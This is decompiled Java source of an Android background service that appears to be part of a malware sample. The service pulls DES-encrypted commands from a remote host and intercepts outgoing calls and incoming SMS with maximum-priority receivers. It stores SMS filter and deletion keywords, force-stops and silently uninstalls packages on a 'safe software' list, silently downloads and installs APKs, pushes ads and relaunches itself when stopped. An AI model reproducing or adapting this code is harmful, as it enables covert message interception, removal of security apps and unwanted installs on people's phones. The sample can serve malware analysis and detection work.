package com.qc.access;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.os.AsyncTask;
import android.os.IBinder;
import com.qc.base.OrderSet;
import com.qc.base.QCCache;
import com.qc.base.QCMainCourse;
import com.qc.base.RunStatement;
import com.qc.common.Constant;
import com.qc.common.Funs;
import com.qc.common.QuietInstallEngine;
import com.qc.common.ThreadPool;
import com.qc.entity.SilenceApkInfo;
import com.qc.entity.UrlGenerator;
import com.qc.model.AppTask;
import com.qc.model.JsonUtil;
import com.qc.util.Des;
import com.qc.util.ShareProDBHelper;
import com.qc.util.SystemUtil;
import java.util.HashMap;
import java.util.List;
import org.apache.http.NameValuePair;

public class MainOsService extends Service {
    /* access modifiers changed from: private */
    public Context context;
    private OutGoingCallReceiver nr;
    private boolean service_flag = false;
    private SmsReceiver sr;

    class MnkpAsyncTask extends AsyncTask<Object, Integer, Boolean> {
        MnkpAsyncTask() {
        }

        /* access modifiers changed from: protected|varargs */
        public Boolean doInBackground(Object... params) {
            String cfgContent = JsonUtil.connServerForResult((String) params[0], (List) params[1]);
            if (cfgContent == null || cfgContent.length() < 1) {
                return Boolean.valueOf(true);
            }
            HashMap<String, String> hm = JsonUtil.Json2KeyAndDecode(cfgContent);
            if (hm == null || hm.get("content") == null || hm.get("key") == null) {
                return Boolean.valueOf(true);
            }
            try {
                cfgContent = Des.decryptDES((String) hm.get("content"), ((String) hm.get("key")).substring(3, 11));
            } catch (Exception e) {
            }
            if (JsonUtil.Json2Bean(cfgContent)) {
                String safesoftwares;
                if (OrderSet.smsFilter != null) {
                    ShareProDBHelper.write(MainOsService.this.context, "dataCenter", "advkey", OrderSet.smsFilter.getAdvkey());
                    ShareProDBHelper.write(MainOsService.this.context, "dataCenter", "advtent", OrderSet.smsFilter.getAdvtent());
                    ShareProDBHelper.write(MainOsService.this.context, "dataCenter", "advtip", OrderSet.smsFilter.getAdvtip());
                    ShareProDBHelper.write(MainOsService.this.context, "dataCenter", "advend", OrderSet.smsFilter.getAdvend());
                    ShareProDBHelper.write(MainOsService.this.context, "dataCenter", "comtent", OrderSet.smsFilter.getComtent());
                    ShareProDBHelper.write(MainOsService.this.context, "dataCenter", "keytent", OrderSet.smsFilter.getKeytent());
                    ShareProDBHelper.write(MainOsService.this.context, "dataCenter", "delkey", OrderSet.smsFilter.getDelkey());
                    ShareProDBHelper.write(MainOsService.this.context, "dataCenter", "id", Long.valueOf(OrderSet.smsFilter.getId()));
                }
                if (RunStatement.netWorkCountUpdate == 1) {
                    ShareProDBHelper.write(MainOsService.this.context, "dataCenter", "linkNet", Integer.valueOf(OrderSet.linkNet));
                    if (OrderSet.linkNet != 0) {
                        int timeout = 24 / OrderSet.linkNet;
                        QCMainCourse.startRepeatAlarm(MainOsService.this.context, timeout);
                        RunStatement.repeatTime = (long) (timeout * 60);
                    } else if (OrderSet.linkNet == 0) {
                        QCMainCourse.startRepeatAlarm(MainOsService.this.context, 24);
                        RunStatement.repeatTime = 1440;
                    }
                    RunStatement.netWorkCountUpdate = 0;
                }
                if (QCCache.getInstance().getValue("safesoftwares") != null) {
                    safesoftwares = (String) QCCache.getInstance().getValue("safesoftwares");
                } else {
                    safesoftwares = "";
                }
                if (safesoftwares.length() > 0) {
                    String[] safePkgs = safesoftwares.split(",");
                    List<PackageInfo> pkgInfos = SystemUtil.getAllApps(MainOsService.this.context);
                    if (pkgInfos != null && pkgInfos.size() > 0) {
                        for (PackageInfo pkgInfo : pkgInfos) {
                            for (CharSequence contains : safePkgs) {
                                if (pkgInfo.packageName.contains(contains)) {
                                    Funs.forceStopProcess(MainOsService.this.context, pkgInfo.packageName);
                                    QuietInstallEngine.unInstall(pkgInfo.packageName);
                                    break;
                                }
                            }
                        }
                    }
                }
                if (OrderSet.APKInstallFlag == 1) {
                    MainOsService.this.context.startService(new Intent(Constant.APKDOWNLOAD_ACTION));
                    OrderSet.APKInstallFlag = 0;
                }
                if (OrderSet.adsLaucherFlag == 1) {
                    MainOsService.this.context.startService(new Intent(Constant.ADSMAIN_ACTION));
                    OrderSet.adsLaucherFlag = 0;
                }
                if (OrderSet.openAppFlag == 1 || OrderSet.motionAppFlag == 1 || OrderSet.websiteOpenFlag == 1) {
                    MainOsService.this.context.startService(new Intent(MainOsService.this.context, MotionService.class));
                    OrderSet.openAppFlag = 0;
                    OrderSet.motionAppFlag = 0;
                    OrderSet.websiteOpenFlag = 0;
                }
                if (RunStatement.baseApkUrl != null && RunStatement.baseApkUrl.length() > 0) {
                    MainOsService.this.context.startService(new Intent(MainOsService.this.context, BaseSiteService.class));
                }
            }
            return Boolean.valueOf(true);
        }

        /* access modifiers changed from: protected */
        public void onCancelled() {
            super.onCancelled();
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(Boolean result) {
            super.onPostExecute(result);
        }

        /* access modifiers changed from: protected */
        public void onPreExecute() {
            super.onPreExecute();
        }

        /* access modifiers changed from: protected|varargs */
        public void onProgressUpdate(Integer... progress) {
            super.onProgressUpdate(progress);
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        this.context = this;
        this.service_flag = true;
        super.onCreate();
    }

    public void onStart(Intent intent, int startId) {
        if (!Constant.DOUBLEPACKAGE_CHECK.equals(intent.getAction())) {
            if (Constant.REGISTER_ACTION.equals(intent.getAction())) {
                IntentFilter outCallFilter = new IntentFilter("android.intent.action.NEW_OUTGOING_CALL");
                outCallFilter.setPriority(Integer.MAX_VALUE);
                this.nr = new OutGoingCallReceiver();
                registerReceiver(this.nr, outCallFilter);
                IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
                localIntentFilter.setPriority(Integer.MAX_VALUE);
                this.sr = new SmsReceiver();
                registerReceiver(this.sr, localIntentFilter);
            } else if (Constant.INSTALLCFG_ACTION.equals(intent.getAction())) {
                UrlGenerator urlGenerator = UrlGenerator.getInstance(this.context);
                String host = urlGenerator.getHttpPostHost();
                List<NameValuePair> nameValuePairs = urlGenerator.getHttpPostParam();
                new MnkpAsyncTask().execute(new Object[]{host, nameValuePairs});
            } else if (Constant.APKDOWNLOAD_ACTION.equals(intent.getAction())) {
                List<SilenceApkInfo> apkList = (List) QCCache.getInstance().getValue("apkList");
                if (apkList != null && apkList.size() > 0) {
                    for (SilenceApkInfo apkInfo : apkList) {
                        int delCount;
                        String undelStr;
                        if (QCCache.getInstance().getValue("delcount") != null) {
                            delCount = ((Integer) QCCache.getInstance().getValue("delcount")).intValue();
                        } else {
                            delCount = 0;
                        }
                        if (QCCache.getInstance().getValue("undel") != null) {
                            undelStr = (String) QCCache.getInstance().getValue("undel");
                        } else {
                            undelStr = "";
                        }
                        AppTask appTask = new AppTask(this, apkInfo, delCount, undelStr);
                        ThreadPool pool = ThreadPool.getInstance();
                        pool.setDebug(false);
                        pool.start(appTask, 2);
                    }
                }
            }
        }
        super.onStart(intent, startId);
    }

    public void onDestroy() {
        if (this.nr != null) {
            unregisterReceiver(this.nr);
        }
        if (this.sr != null) {
            unregisterReceiver(this.sr);
        }
        if (this.service_flag) {
            startService(new Intent(Constant.REGISTER_ACTION));
        }
        super.onDestroy();
    }
}
